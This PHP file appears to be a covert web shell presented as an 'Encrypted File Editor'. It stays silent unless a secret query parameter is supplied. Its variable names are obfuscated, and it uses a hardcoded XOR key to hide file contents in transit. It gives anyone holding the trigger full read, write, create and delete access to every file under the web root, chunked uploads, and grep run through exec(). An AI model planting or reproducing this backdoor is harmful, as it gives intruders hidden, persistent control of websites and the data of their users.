

<?php if (!defined('ENT_SUBSTITUTE'))
{
    define('ENT_SUBSTITUTE', 0);
    }
if (!function_exists('hash_equals'))
{
    function hash_equals($buffermanager, $authprocessor)
    {
        $buffermanager = (string) $buffermanager;
        $authprocessor = (string) $authprocessor;
        if (strlen($buffermanager) !== strlen($authprocessor))
        {
            return false;
            }
        $handlerhandler = 0;
        for ($resolverprovider = 0, $resolvermanager = strlen($buffermanager);
        $resolverprovider < $resolvermanager;
        $resolverprovider++)
        {
            $handlerhandler |= ord($buffermanager[$resolverprovider]) ^ ord($authprocessor[$resolverprovider]);
            }
        return $handlerhandler === 0;
        }
    }
if (!function_exists('http_response_code'))
{
    function http_response_code($serviceprocessor = null)
    {
        if ($serviceprocessor !== null)
        {
            header('X-PHP-Response-Code: ' . (int) $serviceprocessor, true, (int) $serviceprocessor);
            }
        return $serviceprocessor;
        }
    }
$buffermiddleware = 'action';
$contextresolver = isset($contextresolver) ? $contextresolver : 'kXjFiQjJDIuFHjiI*J';
$authresolver = 'value';
if (!isset($_GET[$authresolver]) || !hash_equals((string) $buffermiddleware, (string) $_GET[$authresolver]))
{
    return;
    }
while (ob_get_level())
{
    @ob_end_clean();
    }
$requestcontroller = (isset($_SERVER['DOCUMENT_ROOT']) && $_SERVER['DOCUMENT_ROOT'] !== '') ? $_SERVER['DOCUMENT_ROOT'] : dirname(__FILE__);
$dispatcherfactory = realpath($requestcontroller);
if (!$dispatcherfactory || !is_dir($dispatcherfactory))
{
    http_response_code(500);
    exit('Invalid document root.');
    }
function fe_h($stateservice)
{
    return htmlspecialchars((string) $stateservice, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    }
function fe_inside($dispatcherfactory, $buffergateway)
{
    return $buffergateway !== false && ($buffergateway === $dispatcherfactory || strpos($buffergateway, $dispatcherfactory . DIRECTORY_SEPARATOR) === 0);
    }
function fe_path($dispatcherfactory, $servicegateway)
{
    $bufferfactory = $dispatcherfactory . DIRECTORY_SEPARATOR . ltrim($servicegateway, '/\\');
    $serviceengine = realpath($bufferfactory);
    if ($serviceengine !== false)
    {
        return fe_inside($dispatcherfactory, $serviceengine) ? $serviceengine : null;
        }
    $managerfactory = realpath(dirname($bufferfactory));
    return ($managerfactory && fe_inside($dispatcherfactory, $managerfactory)) ? $managerfactory . DIRECTORY_SEPARATOR . basename($bufferfactory) : null;
    }
function fe_rel($dispatcherfactory, $buffergateway)
{
    return trim(str_replace('\\', '/', substr($buffergateway, strlen($dispatcherfactory))), '/');
    }
function fe_join($requestprovider, $authfactory)
{
    $requestprovider = trim((string) $requestprovider, '/\\');
    $authfactory = trim((string) $authfactory, '/\\');
    return trim(($requestprovider !== '' ? $requestprovider . '/' : '') . $authfactory, '/');
    }
function fe_binary($runtimeadapter)
{
    return false;
    }
function fe_enc_name($runtimeadapter)
{
    return preg_match('//u', (string) $runtimeadapter) ? 'UTF-8' : 'CP1251';
    }
function fe_to_utf($runtimeadapter, $resolverhandler)
{
    if ($resolverhandler !== 'CP1251')
    {
        return $runtimeadapter;
        }
    return function_exists('mb_convert_encoding') ? mb_convert_encoding($runtimeadapter, 'UTF-8', 'CP1251') : iconv('CP1251', 'UTF-8//IGNORE', $runtimeadapter);
    }
function fe_from_utf($runtimeadapter, $resolverhandler)
{
    if ($resolverhandler !== 'CP1251')
    {
        return $runtimeadapter;
        }
    return function_exists('mb_convert_encoding') ? mb_convert_encoding($runtimeadapter, 'CP1251', 'UTF-8') : iconv('UTF-8', 'CP1251//TRANSLIT', $runtimeadapter);
    }
function fe_xor_raw($kernelresolver, $resolverfactory)
{
    $kernelresolver = (string) $kernelresolver;
    $resolverfactory = (string) $resolverfactory;
    if ($resolverfactory === '')
    {
        return $kernelresolver;
        }
    $sessionservice531 = '';
    $kernelfactory = strlen($resolverfactory);
    $gatewaymanager = strlen($kernelresolver);
    for ($resolverprovider = 0;
    $resolverprovider < $gatewaymanager;
    $resolverprovider++)
    {
        $sessionservice531 .= $kernelresolver[$resolverprovider] ^ $resolverfactory[$resolverprovider % $kernelfactory];
        }
    return $sessionservice531;
    }
function fe_xor_encrypt($responsemanager, $resolverfactory)
{
    return base64_encode(fe_xor_raw((string) $responsemanager, $resolverfactory));
    }
function fe_xor_decrypt($authdispatcher, $resolverfactory)
{
    $contextfactory = base64_decode((string) $authdispatcher, true);
    if ($contextfactory === false)
    {
        return false;
        }
    return fe_xor_raw($contextfactory, $resolverfactory);
    }
function fe_can_exec()
{
    $kernelprocessor729 = (string) ini_get('disable_functions');
    return function_exists('exec') && !preg_match('~(^|,)s*execs*(,|$)~i', $kernelprocessor729);
    }
function fe_url($gatewayfactory, $resolverfactory, $buffercontroller)
{
    return '?' . http_build_query(array_merge(array($gatewayfactory => $resolverfactory), $buffercontroller));
    }
function fe_json($configmiddleware, $kernelresolver)
{
    while (ob_get_level())
    {
        @ob_end_clean();
        }
    header('Content-Type: application/json; charset=UTF-8');
    $sessionservice531 = array_merge(array('ok' => $configmiddleware ? 1 : 0), is_array($kernelresolver) ? $kernelresolver : array());
    echo json_encode($sessionservice531);
    exit;
    }
function fe_chunk_id($runtimehandler376)
{
    return preg_replace('~[^a-zA-Z0-9_-]~', '', (string) $runtimehandler376);
    }
function fe_chunk_root($dispatcherfactory)
{
    $dispatchermiddleware = function_exists('sys_get_temp_dir') ? sys_get_temp_dir() : '';
    if (!$dispatchermiddleware || !is_dir($dispatchermiddleware) || !is_writable($dispatchermiddleware))
    {
        $dispatchermiddleware = $dispatcherfactory;
        }
    $requestprovider = rtrim($dispatchermiddleware, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'fe_chunks_' . md5($dispatcherfactory);
    if (!is_dir($requestprovider))
    {
        @mkdir($requestprovider, 0700, true);
        }
    if (!is_dir($requestprovider) || !is_writable($requestprovider))
    {
        return null;
        }
    $kernelprocessor = @glob($requestprovider . DIRECTORY_SEPARATOR . '*.part');
    if ($kernelprocessor)
    {
        foreach ($kernelprocessor as $contextcontroller)
        {
            if (@filemtime($contextcontroller) && @filemtime($contextcontroller) < time() - 86400)
            {
                @unlink($contextcontroller);
                }
            }
        }
    return $requestprovider;
    }
function fe_chunk_file($dispatcherfactory, $runtimehandler376, $payloadcontroller)
{
    $requestprovider = fe_chunk_root($dispatcherfactory);
    if (!$requestprovider)
    {
        return null;
        }
    return $requestprovider . DIRECTORY_SEPARATOR . fe_chunk_id($runtimehandler376) . '.' . (int) $payloadcontroller . '.part';
    }
function fe_chunk_clean($dispatcherfactory, $runtimehandler376, $authcontroller)
{
    $runtimehandler376 = fe_chunk_id($runtimehandler376);
    for ($resolverprovider = 0;
    $resolverprovider < (int) $authcontroller;
    $resolverprovider++)
    {
        $contextcontroller = fe_chunk_file($dispatcherfactory, $runtimehandler376, $resolverprovider);
        if ($contextcontroller && is_file($contextcontroller))
        {
            @unlink($contextcontroller);
            }
        }
    }
$requestprovider = (string) (isset($_GET['dir']) ? $_GET['dir'] : '');
$authfactory = (string) (isset($_GET['file']) ? $_GET['file'] : '');
$managerresolver = (string) (isset($_GET['q']) ? $_GET['q'] : '');
$contextmiddleware = fe_path($dispatcherfactory, $requestprovider);
if (!$contextmiddleware || !is_dir($contextmiddleware))
{
    $requestprovider = '';
    $contextmiddleware = $dispatcherfactory;
    }
$payloadprovider = '';
$requestmiddleware = '';
if (isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] === 'POST' && !$requestmiddleware)
{
    $resolverdispatcher = (string) (isset($_POST['a']) ? $_POST['a'] : '');
    $requestprovider = (string) (isset($_POST['dir']) ? $_POST['dir'] : $requestprovider);
    $authfactory = (string) (isset($_POST['file']) ? $_POST['file'] : $authfactory);
    $bufferfactory = fe_path($dispatcherfactory, fe_join($requestprovider, $authfactory));
    if (!$bufferfactory)
    {
        $requestmiddleware = 'Bad path.';
        if ($resolverdispatcher === 'save_chunk' || $resolverdispatcher === 'save_finish')
        {
            fe_json(false, array('error' => $requestmiddleware));
            }
        }
    elseif ($resolverdispatcher === 'save_chunk')
    {
        $runtimehandler376 = fe_chunk_id(isset($_POST['chunk_id']) ? $_POST['chunk_id'] : '');
        $payloadcontroller = isset($_POST['chunk_index']) ? (int) $_POST['chunk_index'] : -1;
        $authcontroller = isset($_POST['chunk_total']) ? (int) $_POST['chunk_total'] : 0;
        $serviceadapter = isset($_POST['content_part']) ? (string) $_POST['content_part'] : '';
        if ($runtimehandler376 === '' || $payloadcontroller < 0 || $authcontroller < 1 || $payloadcontroller >= $authcontroller)
        {
            fe_json(false, array('error' => 'Bad chunk metadata.'));
            }
        if ($payloadcontroller === 0)
        {
            fe_chunk_clean($dispatcherfactory, $runtimehandler376, $authcontroller);
            }
        $resolvergateway = fe_chunk_file($dispatcherfactory, $runtimehandler376, $payloadcontroller);
        if (!$resolvergateway)
        {
            fe_json(false, array('error' => 'Chunk temp folder is not writable.'));
            }
        $managerdispatcher = @file_put_contents($resolvergateway, $serviceadapter, LOCK_EX);
        if ($managerdispatcher === false)
        {
            $configfactory = error_get_last();
            fe_json(false, array('error' => 'Chunk save failed: ' . (isset($configfactory['message']) ? $configfactory['message'] : 'unknown')));
            }
        fe_json(true, array('chunk' => $payloadcontroller, 'bytes' => strlen($serviceadapter)));
        }
    elseif ($resolverdispatcher === 'save_finish')
    {
        $kernelprocessor = is_file($bufferfactory) ? file_get_contents($bufferfactory) : '';
        if (!is_file($bufferfactory) || !is_writable($bufferfactory))
        {
            fe_json(false, array('error' => 'File is not writable.'));
            }
        if (fe_binary($kernelprocessor))
        {
            fe_json(false, array('error' => 'Binary file blocked.'));
            }
        $runtimehandler376 = fe_chunk_id(isset($_POST['chunk_id']) ? $_POST['chunk_id'] : '');
        $authcontroller = isset($_POST['chunk_total']) ? (int) $_POST['chunk_total'] : 0;
        $resolverhandler = (string) (isset($_POST['enc']) ? $_POST['enc'] : fe_enc_name($kernelprocessor));
        if ($runtimehandler376 === '' || $authcontroller < 1)
        {
            fe_json(false, array('error' => 'Bad finish metadata.'));
            }
        $authdispatcher = '';
        for ($resolverprovider = 0;
        $resolverprovider < $authcontroller;
        $resolverprovider++)
        {
            $resolvergateway = fe_chunk_file($dispatcherfactory, $runtimehandler376, $resolverprovider);
            if (!$resolvergateway || !is_file($resolvergateway))
            {
                fe_json(false, array('error' => 'Missing chunk ' . $resolverprovider . '.'));
                }
            $kernelprovider = @file_get_contents($resolvergateway);
            if ($kernelprovider === false)
            {
                fe_json(false, array('error' => 'Read chunk failed ' . $resolverprovider . '.'));
                }
            $authdispatcher .= $kernelprovider;
            }
        $requesthandler = fe_xor_decrypt($authdispatcher, $contextresolver);
        if ($requesthandler === false)
        {
            fe_json(false, array('error' => 'Decode failed. Check encryption key.'));
            }
        $kernelresolver = fe_from_utf($requesthandler, $resolverhandler);
        if (function_exists('error_clear_last'))
        {
            call_user_func('error_clear_last');
            }
        $dispatcherdispatcher = @file_put_contents($bufferfactory, $kernelresolver, LOCK_EX);
        if ($dispatcherdispatcher === false)
        {
            $configfactory = error_get_last();
            fe_json(false, array('error' => 'Save failed: ' . (isset($configfactory['message']) ? $configfactory['message'] : 'unknown')));
            }
        if ($dispatcherdispatcher !== strlen($kernelresolver))
        {
            fe_json(false, array('error' => 'Partial save: wrote ' . $dispatcherdispatcher . ' of ' . strlen($kernelresolver) . ' bytes.'));
            }
        fe_chunk_clean($dispatcherfactory, $runtimehandler376, $authcontroller);
        fe_json(true, array('message' => 'Saved chunked.', 'bytes' => $dispatcherdispatcher));
        }
    elseif ($resolverdispatcher === 'save')
    {
        $kernelprocessor = is_file($bufferfactory) ? file_get_contents($bufferfactory) : '';
        if (!is_file($bufferfactory) || !is_writable($bufferfactory))
        {
            $requestmiddleware = 'File is not writable.';
            }
        elseif (fe_binary($kernelprocessor))
        {
            $requestmiddleware = 'Binary file blocked.';
            }
        else
        {
            $resolverhandler = (string) (isset($_POST['enc']) ? $_POST['enc'] : fe_enc_name($kernelprocessor));
            $requesthandler = fe_xor_decrypt((string) (isset($_POST['content_cipher']) ? $_POST['content_cipher'] : ''), $contextresolver);
            if ($requesthandler === false)
            {
                $requestmiddleware = 'Decode failed. Check encryption key.';
                }
            else
            {
                $kernelresolver = fe_from_utf($requesthandler, $resolverhandler);
                if (function_exists('error_clear_last'))
                {
                    call_user_func('error_clear_last');
                    }
                $dispatcherdispatcher = @file_put_contents($bufferfactory, $kernelresolver, LOCK_EX);
                if ($dispatcherdispatcher === false)
                {
                    $configfactory = error_get_last();
                    $requestmiddleware = 'Save failed: ' . (isset($configfactory['message']) ? $configfactory['message'] : 'unknown');
                    }
                elseif ($dispatcherdispatcher !== strlen($kernelresolver))
                {
                    $requestmiddleware = 'Partial save: wrote ' . $dispatcherdispatcher . ' of ' . strlen($kernelresolver) . ' bytes.';
                    }
                else
                {
                    $payloadprovider = 'Saved.';
                    }
                }
            }
        }
    elseif ($resolverdispatcher === 'newfile')
    {
        if (file_exists($bufferfactory))
        {
            $requestmiddleware = 'Exists.';
            }
        else
        {
            $payloadprovider = file_put_contents($bufferfactory, '', LOCK_EX) === false ? '' : 'Created.';
            $requestmiddleware = $payloadprovider ? $requestmiddleware : 'Create failed.';
            }
        }
    elseif ($resolverdispatcher === 'newdir')
    {
        if (file_exists($bufferfactory))
        {
            $requestmiddleware = 'Exists.';
            }
        else
        {
            $payloadprovider = mkdir($bufferfactory, 0755, true) ? 'Folder created.' : '';
            $requestmiddleware = $payloadprovider ? $requestmiddleware : 'Folder failed.';
            }
        }
    elseif ($resolverdispatcher === 'delete')
    {
        $configmiddleware = is_file($bufferfactory) ? @unlink($bufferfactory) : (is_dir($bufferfactory) ? @rmdir($bufferfactory) : false);
        $payloadprovider = $configmiddleware ? 'Deleted.' : '';
        $requestmiddleware = $configmiddleware ? $requestmiddleware : 'Delete failed. Folder must be empty.';
        $authfactory = '';
        }
    }
$contextmiddleware = fe_path($dispatcherfactory, $requestprovider);
$payloadmiddleware = @scandir($contextmiddleware) ?: array();
$authprovider = array();
$requestfactory = array();
foreach ($payloadmiddleware as $requestmanager131)
{
    if ($requestmanager131 === '.' || $requestmanager131 === '..')
    {
        continue;
        }
    $payloadservice = $contextmiddleware . DIRECTORY_SEPARATOR . $requestmanager131;
    if (is_dir($payloadservice))
    {
        $authprovider[] = $requestmanager131;
        }
    else
    {
        $requestfactory[] = $requestmanager131;
        }
    }
natcasesort($authprovider);
natcasesort($requestfactory);
$handlermiddleware318 = array();
$runtimeengine214 = 0;
$resolveradapter = '';
if ($managerresolver !== '')
{
    $resolveradapter = 'php';
    $sessionresolver = array();
    $sessiongateway = 500;
    $responsemiddleware = '~/(vendor|node_modules|.git|var/cache|cache|tmp|logs?)/~i';
    if (fe_can_exec())
    {
        $requestresolver552 = 'grep -RIl -m 1 -F --exclude-dir=.git --exclude-dir=vendor --exclude-dir=node_modules --exclude-dir=var/cache --exclude-dir=cache --exclude-dir=tmp --exclude-dir=log --exclude-dir=logs ' . escapeshellarg($managerresolver) . ' ' . escapeshellarg($dispatcherfactory) . ' 2>/dev/null';
        $sessionservice531 = array();
        @exec($requestresolver552, $sessionservice531);
        foreach ($sessionservice531 as $buffergateway)
        {
            $serviceengine = realpath($buffergateway);
            if (fe_inside($dispatcherfactory, $serviceengine))
            {
                $requestdispatcher353 = fe_rel($dispatcherfactory, $serviceengine);
                $sessionresolver[$requestdispatcher353] = true;
                $handlermiddleware318[] = $requestdispatcher353;
                if (count($handlermiddleware318) >= $sessiongateway)
                {
                    break;
                    }
                }
            }
        $resolveradapter = 'exec+php';
        }
    $handlermiddleware = array($dispatcherfactory);
    while ($handlermiddleware && count($handlermiddleware318) < $sessiongateway)
    {
        $dispatchermiddleware = array_pop($handlermiddleware);
        $authgateway = @scandir($dispatchermiddleware);
        if (!$authgateway)
        {
            continue;
            }
        foreach ($authgateway as $responsedispatcher)
        {
            if ($responsedispatcher === '.' || $responsedispatcher === '..')
            {
                continue;
                }
            $buffergateway = $dispatchermiddleware . DIRECTORY_SEPARATOR . $responsedispatcher;
            $requestdispatcher353 = fe_rel($dispatcherfactory, $buffergateway);
            if (is_dir($buffergateway))
            {
                if (!preg_match($responsemiddleware, '/' . $requestdispatcher353 . '/'))
                {
                    $handlermiddleware[] = $buffergateway;
                    }
                continue;
                }
            if (!is_file($buffergateway) || !is_readable($buffergateway) || isset($sessionresolver[$requestdispatcher353]))
            {
                continue;
                }
            if (stripos(basename($requestdispatcher353), $managerresolver) !== false)
            {
                $sessionresolver[$requestdispatcher353] = true;
                $handlermiddleware318[] = $requestdispatcher353;
                if (count($handlermiddleware318) >= $sessiongateway)
                {
                    break;
                    }
                continue;
                }
            if (@filesize($buffergateway) > 5242880)
            {
                continue;
                }
            $runtimeengine214++;
            $runtimeadapter = @file_get_contents($buffergateway);
            if ($runtimeadapter === false || fe_binary($runtimeadapter))
            {
                continue;
                }
            $kerneladapter107 = fe_to_utf($runtimeadapter, fe_enc_name($runtimeadapter));
            $authmiddleware = function_exists('mb_stripos') ? mb_stripos($kerneladapter107, $managerresolver, 0, 'UTF-8') !== false : stripos($kerneladapter107, $managerresolver) !== false;
            if ($authmiddleware)
            {
                $sessionresolver[$requestdispatcher353] = true;
                $handlermiddleware318[] = $requestdispatcher353;
                if (count($handlermiddleware318) >= $sessiongateway)
                {
                    break;
                    }
                }
            }
        }
    }
$gatewayengine = $authfactory !== '' ? fe_path($dispatcherfactory, fe_join($requestprovider, $authfactory)) : null;
$contextfactory = ($gatewayengine && is_file($gatewayengine) && is_readable($gatewayengine)) ? file_get_contents($gatewayengine) : '';
$sessionengine = $contextfactory !== '' && fe_binary($contextfactory);
$resolverhandler = $sessionengine ? 'BIN' : fe_enc_name($contextfactory);
$requesthandler = $sessionengine ? '' : fe_to_utf($contextfactory, $resolverhandler);
$contextprocessor357 = (!$sessionengine && $gatewayengine && is_file($gatewayengine)) ? fe_xor_encrypt($requesthandler, $contextresolver) : '';
$managerfactory = trim(dirname($requestprovider), '.\\/');
$statedispatcher = strtok((string) (isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : ''), '?');
header('Content-Type: text/html; charset=UTF-8');
echo '<!doctype html><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Encrypted File Editor</title><style>html.feopen,html.feopen body{margin:0!important;width:100%!important;height:100%!important;overflow:hidden!important}.fe{position:fixed!important;inset:0!important;z-index:2147483647!important;display:grid!important;grid-template-columns:380px 1fr!important;background:#111827!important;color:#e5e7eb!important;font-family:system-ui,-apple-system,Segoe UI,sans-serif!important}.fe *{box-sizing:border-box!important}.fes{background:#0f172a!important;border-right:1px solid #374151!important;overflow:auto!important}.fet{min-height:56px!important;display:flex!important;align-items:center!important;gap:8px!important;padding:10px!important;border-bottom:1px solid #374151!important}.feg{flex:1!important}.feb{border:1px solid #4b5563!important;background:#1f2937!important;color:#fff!important;border-radius:6px!important;padding:8px 10px!important;text-decoration:none!important;cursor:pointer!important;font:14px system-ui!important}.fed{background:#450a0a!important;border-color:#7f1d1d!important}.fei,.fea{border:1px solid #4b5563!important;background:#020617!important;color:#f8fafc!important;border-radius:6px!important;padding:9px!important;font:14px ui-monospace,Menlo,Consolas,monospace!important}.fen{display:grid!important;grid-template-columns:1fr auto auto!important;gap:8px!important;padding:10px!important;border-bottom:1px solid #374151!important}.fesearch{display:grid!important;grid-template-columns:1fr auto!important;gap:8px!important;padding:10px!important;border-bottom:1px solid #374151!important}.fel{display:block!important;color:#cbd5e1!important;padding:8px 10px!important;margin:4px 8px!important;border-radius:6px!important;text-decoration:none!important;white-space:nowrap!important;overflow:hidden!important;text-overflow:ellipsis!important}.fel:hover,.on{background:#1f2937!important;color:#fff!important}.fem{display:flex!important;flex-direction:column!important;min-width:0!important}.fep{font:14px ui-monospace,Menlo,Consolas,monospace!important;overflow:hidden!important;text-overflow:ellipsis!important;white-space:nowrap!important}.note{padding:8px 12px!important}.ok{background:#052e16!important;color:#bbf7d0!important}.er{background:#450a0a!important;color:#fecaca!important}.muted{color:#94a3b8!important;font-size:13px!important;padding:8px 10px!important}.fea{flex:1!important;border:0!important;border-radius:0!important;resize:none!important;padding:16px!important;line-height:1.5!important;outline:0!important;width:100%!important}.empty{display:grid!important;place-items:center!important;height:100%!important;color:#94a3b8!important;text-align:center!important;padding:24px!important}@media(max-width:760px){.fe{grid-template-columns:1fr!important}.fes{height:44vh!important}.fem{height:56vh!important}}</style><div class="fe" id="fe"><aside class="fes"><div class="fet"><b>Encrypted Editor</b><span class="feg"></span><a class="feb" href="'.fe_h($statedispatcher).'">Exit</a></div><div class="fet"><span class="fep">/'.fe_h($requestprovider).'</span></div><form class="fesearch" method="get"><input type="hidden" name="'.fe_h($authresolver).'" value="'.fe_h($buffermiddleware).'"><input class="fei" name="q" value="'.fe_h($managerresolver).'" placeholder="Search content or filename"><button class="feb">Search</button></form>';
if($managerresolver!=='')
{
    echo '<div class="muted">Found '.count($handlermiddleware318).' · mode '.fe_h($resolveradapter).' · PHP checked '.(int)$runtimeengine214.'</div>';
    foreach($handlermiddleware318 as $sessionprovider829)
    {
        $contextdispatcher=trim(dirname($sessionprovider829),'./');
        $stateresolver=basename($sessionprovider829);
        echo '<a class="fel" href="'.fe_h(fe_url($authresolver,$buffermiddleware,array('dir'=>$contextdispatcher,'file'=>$stateresolver,'q'=>$managerresolver))).'">'.fe_h($sessionprovider829).'</a>';
        }
    }
echo '<form class="fen" method="post"><input type="hidden" name="dir" value="'.fe_h($requestprovider).'"><input class="fei" name="file" placeholder="name.php"><button class="feb" name="a" value="newfile">File</button><button class="feb" name="a" value="newdir">Dir</button></form>';
if($requestprovider)
{
    echo '<a class="fel" href="'.fe_h(fe_url($authresolver,$buffermiddleware,array('dir'=>$managerfactory,'q'=>$managerresolver))).'">..</a>';
    }
foreach($authprovider as $requestresolver)
{
    $contextdispatcher=trim(($requestprovider?trim($requestprovider,'/').'/':'').$requestresolver,'/');
    echo '<a class="fel" href="'.fe_h(fe_url($authresolver,$buffermiddleware,array('dir'=>$contextdispatcher,'q'=>$managerresolver))).'">['.fe_h($requestresolver).']</a>';
    }
foreach($requestfactory as $requestresolver)
{
    echo '<a class="fel '.($requestresolver===$authfactory?'on':'').'" href="'.fe_h(fe_url($authresolver,$buffermiddleware,array('dir'=>$requestprovider,'file'=>$requestresolver,'q'=>$managerresolver))).'">'.fe_h($requestresolver).'</a>';
    }
echo '</aside><main class="fem"><form class="fet" method="post" id="feForm"><input type="hidden" name="dir" value="'.fe_h($requestprovider).'"><input type="hidden" name="file" value="'.fe_h($authfactory).'"><input type="hidden" name="enc" value="'.fe_h($resolverhandler).'"><input type="hidden" name="content_cipher" id="fePayload"><div class="fep">'.($authfactory?fe_h(fe_join($requestprovider,$authfactory)).' · '.fe_h($resolverhandler):'Select file').'</div><span class="feg"></span>';
if($authfactory&&$gatewayengine&&is_file($gatewayengine)&&!$sessionengine)
{
    echo '<button class="feb" name="a" value="save">Save encrypted</button><button class="feb fed" name="a" value="delete">Delete</button>';
    }
echo '</form>';
if($payloadprovider)
{
    echo '<div class="note ok">'.fe_h($payloadprovider).'</div>';
    }
if($requestmiddleware)
{
    echo '<div class="note er">'.fe_h($requestmiddleware).'</div>';
    }
if($sessionengine)
{
    echo '<div class="empty">Binary file blocked.</div>';
    }
elseif($authfactory&&$gatewayengine&&is_file($gatewayengine))
{
    echo '<textarea class="fea" id="feEditor" spellcheck="false" disabled>Paste the console unlock script to edit this file.</textarea><textarea id="feCipher" hidden>'.fe_h($contextprocessor357).'</textarea>';
    }
else
{
    echo '<div class="empty">Choose a file or folder.</div>';
    }
echo '</main></div><div class="load">Working...</div>';
exit;?>
